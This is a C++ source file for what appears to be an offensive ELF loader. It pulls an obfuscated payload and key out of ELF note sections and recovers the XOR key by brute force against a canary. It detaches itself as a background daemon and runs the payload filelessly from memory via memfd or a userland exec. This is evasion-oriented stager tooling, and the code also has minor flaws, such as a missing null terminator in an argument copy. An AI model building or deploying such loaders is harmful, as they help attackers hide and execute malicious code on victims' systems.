//
// Created by dev on 1/11/22.
//

#include <elfldr.h>

using namespace std;
using namespace ELFIO;

bool get_psection_data(ELFIO::elfio &reader,
                       unsigned int psec_num,
                       void **p_data, Elf_Word *p_data_sz) {
    Elf_Word type;
    std::string name;
    bool found = FALSE;

    // There should be at least 2 entries in section: key and algo
    cout << "Checking psec_num: " << psec_num << endl;
    Elf_Word sec_entries_n = get_section_entries_n(reader, psec_num);
    if (sec_entries_n < PSEC_NENTRY) {
        err(EXIT_FAILURE, "ksec ix is %d, < %d", sec_entries_n, PSEC_NENTRY);
    }

    section *note_sec = reader.sections[psec_num];
    note_section_accessor notes_reader(reader, note_sec);

    if (notes_reader.get_note(0x0, type, name, *p_data, *p_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " Data sz:" << p_data_sz << endl;
        found = TRUE;
    }

    return found;
}

void set_psection_data(ELFIO::elfio &reader,
                       unsigned int psec_num,
                       Elf_Word p_data_sz, const char * dst_elf_file) {
    Elf_Word type;
    std::string name;
    bool found = FALSE;

    // There should be at least PSEC_NENTRY entries in section: key and algo
    cout << "Checking psec_num: " << psec_num << endl;
    Elf_Word sec_entries_n = get_section_entries_n(reader, psec_num);
    if (sec_entries_n < PSEC_NENTRY) {
        err(EXIT_FAILURE, "ksec ix is %d, < %d", sec_entries_n, PSEC_NENTRY);
    }

    section *note_sec = reader.sections[psec_num];
    note_section_accessor notes_writer(reader, note_sec);

    void * p_data = calloc(p_data_sz,sizeof(char));
    if ( p_data == NULL) {
        err(EXIT_FAILURE, "calloc() failed allocating %d\n", p_data_sz);
    }
    note_sec->set_data( (const char*) p_data, p_data_sz);

    if (reader.save(dst_elf_file) == TRUE) {
        cout << "Updated " << dst_elf_file << " OK" << endl;
    }
    if ( p_data != NULL)
        free(p_data);
}


bool get_ksection_data(ELFIO::elfio &reader,
                       unsigned int ksec_num,
                       void **key_data, Elf_Word *key_data_sz,
                       void **algo_data, Elf_Word *algo_data_sz) {
    Elf_Word type;
    std::string name;
    bool found = FALSE;

    // There should be at least 2 entries in section: key and algo
    cout << "Checking ksec_num: " << ksec_num << endl;
    Elf_Word sec_entries_n = get_section_entries_n(reader, ksec_num);
    if (sec_entries_n != KSEC_NENTRY) {
        err(EXIT_FAILURE, "ksec ix is %d, != %d", sec_entries_n, KSEC_NENTRY);
    }

    section *note_sec = reader.sections[ksec_num];
    note_section_accessor notes_reader(reader, note_sec);

    if (notes_reader.get_note(0x0, type, name, *key_data, *key_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " data: " << key_data << " sz:"
             << key_data_sz << endl;
        found = TRUE;
    }
    if (notes_reader.get_note(0x1, type, name, *algo_data, *algo_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x1 << "]" << " type: " << type << " name: " << name << " " << " data: " << algo_data << " sz:"
             << algo_data_sz << endl;
        found = TRUE;
    }

    return found;
}

void daemonize(mem_exec fp, bool memfd_method, unsigned char const *p_data, char ***args) {

    // Fork, allowing the parent process to terminate.
    pid_t pid = fork();
    if (pid == -1) {
        // after first fork(), unsuccessful. exiting with error.
        err(EXIT_FAILURE, "First fork() unsuccessful");
    } else if (pid != 0) {
        // after first fork() in parent. exiting by choice.
        // TODO: clean up if any
        _exit(0);
    }

    // Start a new session for the daemon.
    if (setsid() == -1) {
        // failed to become a session leader while daemonizing
        ;
        err(EXIT_FAILURE, "setsid() unsuccessful");
    }

    // Fork again, allowing the parent process to terminate.
    signal(SIGCHLD, SIG_IGN); // avoid defunct processes.
    pid = fork();
    if (pid == -1) {
        // after second fork(), unsuccessful. exiting with error.
        err(EXIT_FAILURE, "Second fork() unsuccessful");
    } else if (pid != 0) {
        // after second fork() in parent. exiting by choice.
        // TODO: clean up if any
        _exit(0);
    }

    // Set the current working directory to the root directory.
    chdir(DAEMON_CHDIR); // do nothing if it cannot do so, or maybe attempt to chdir elsewhere

    // Set the user file creation mask to zero.
    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    // Reopen STDIN/OUT/ERR to Null
    if (open("/dev/null", O_RDONLY) == -1) {
        printf("Daemon: failed to reopen stdin while daemonizing (errno=%d)", errno);
    }
    if (open("/dev/null", O_WRONLY) == -1) {
        printf("Daemon: failed to reopen stdout while daemonizing (errno=%d)", errno);
    }
    if (open("/dev/null", O_RDWR) == -1) {
        printf("Daemon: failed to reopen stderr while daemonizing (errno=%d)", errno);
    }

    // Execute
    load_exec(memfd_method, (unsigned char const *) p_data, (char ***) args);

}

Elf_Word get_section_entries_n(ELFIO::elfio &reader, unsigned int section_number) {
    note_section_accessor notes_reader(reader, reader.sections[section_number]);
    return notes_reader.get_notes_num();
}

void load_exec(bool memfd_method, unsigned char const *p_data, char ***args) {
    if (memfd_method) {
        debug_print("%s\n", "Exec via memfd");
        reflect_mfd_execv(p_data, *args + 1);
    } else {
        debug_print("%s\n", "Exec via uexec");
        reflect_execv((unsigned char const *) p_data, *args);
    }
}

void set_exec_args( char *** new_argv, char *** argv, int argc, int skip_pos ){

    // allocate memory and copy strings
    //  total argc - number options taken by the callee
    (*new_argv) = (char **) malloc((argc - skip_pos + 1) * sizeof **new_argv);

    // Set up argv[0] for new context
    (*new_argv)[0] = (char *) (malloc(strlen((*argv[0]))));
    memcpy((*new_argv)[0], (*argv)[0], strlen((*argv)[0]));

    // Setup payload exec args, skipping cradle args, start from index 1 (skip argv[0])
    for (int i = 1; i < argc - skip_pos; ++i) {
        size_t length = strlen((*argv)[skip_pos + i]) + 1;
        (*new_argv)[i] = (char *) (malloc(length));
        memcpy((*new_argv)[i], (*argv)[skip_pos + i], length);
    }
    // Finish up array of pointers
    (*new_argv)[argc - skip_pos] = nullptr;

#ifdef DEBUG
    // new_argv
    for (int i = 0; i < argc - skip_pos; ++i) {
        printf("Arg: %s\n", (*new_argv)[i]);
    }
#endif
}

unsigned int find_x_key(void ** key_data ) {

    unsigned int k = 0;
    for (unsigned int i = 0; i < 0xFFFFFFFF; i++) {
        // Rotate back and get lower bits
        if ((rightRotate(*((unsigned char *) *key_data), KSEC_BITSHIFT_POS) ^ i) ==
            KSEC_CANARY_CHAR &&
            (rightRotate(*((unsigned char *) *key_data + 1), KSEC_BITSHIFT_POS) ^ i) ==
            KSEC_CANARY_CHAR &&
            (rightRotate(*((unsigned char *) *key_data + 2), KSEC_BITSHIFT_POS) ^ i) ==
            KSEC_CANARY_CHAR &&
            (rightRotate(*((unsigned char *) *key_data + 3), KSEC_BITSHIFT_POS) ^ i) ==
            KSEC_CANARY_CHAR
                ) {

            k = i & 0xFF; // get lower 16 bits
            break;
        }
    }
    return k;
}

std::filesystem::path get_executable_path() {
    return std::filesystem::canonical("/proc/self/exe");
}

